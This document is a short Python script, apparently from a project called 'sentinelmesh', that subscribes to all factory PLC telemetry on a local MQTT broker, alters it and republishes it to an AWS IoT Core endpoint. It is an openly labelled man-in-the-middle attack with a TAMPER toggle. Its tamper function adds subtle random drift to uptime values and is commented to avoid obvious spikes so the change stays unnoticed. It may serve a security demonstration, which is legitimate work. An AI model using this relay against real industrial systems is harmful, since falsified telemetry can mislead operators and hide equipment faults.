import json
import ssl
import time
import random
import paho.mqtt.client as mqtt

# ====== CONFIG ======

# Local broker (PLAINTEXT)
LOCAL_BROKER = "127.0.0.1"
LOCAL_PORT = 1883
SUB_TOPIC = "factory/+/+/+/telemetry"   # catch all PLC telemetry

# AWS IoT Core (TLS)
AWS_ENDPOINT = "a3vm4tlq95958f-ats.iot.ap-south-1.amazonaws.com"
AWS_PORT = 8883

CA_CERT = "/var/snap/mosquitto/common/certs/AmazonRootCA1.pem"
DEVICE_CERT = "/var/snap/mosquitto/common/certs/cert.crt"
PRIVATE_KEY = "/var/snap/mosquitto/common/certs/key.key"

# Toggle attack
TAMPER = True

# ====================

def tamper(payload: dict) -> dict:
    """
    Subtle, realistic tampering.
    DO NOT do crazy spikes.
    """
    payload["uptime"] += random.randint(3, 7)   # small drift
    payload["mitm"] = True
    return payload

# AWS publisher
aws = mqtt.Client(client_id="sentinelmesh-mitm-forwarder")

aws.tls_set(
    ca_certs=CA_CERT,
    certfile=DEVICE_CERT,
    keyfile=PRIVATE_KEY,
    tls_version=ssl.PROTOCOL_TLSv1_2
)

aws.connect(AWS_ENDPOINT, AWS_PORT, 60)
aws.loop_start()

def on_message(client, userdata, msg):
    try:
        payload = json.loads(msg.payload.decode())
    except Exception as e:
        print("Bad JSON:", e)
        return

    original = payload.copy()

    if TAMPER:
        payload = tamper(payload)

    # Re-publish to the SAME topic in AWS IoT Core
    aws.publish(msg.topic, json.dumps(payload), qos=1)

    print(f"[MITM] {msg.topic}")
    print(f"  before: {original}")
    print(f"  after : {payload}\n")

# Local subscriber
local = mqtt.Client(client_id="sentinelmesh-mitm-subscriber")
local.on_message = on_message
local.connect(LOCAL_BROKER, LOCAL_PORT, 60)
local.subscribe(SUB_TOPIC)
local.loop_forever()
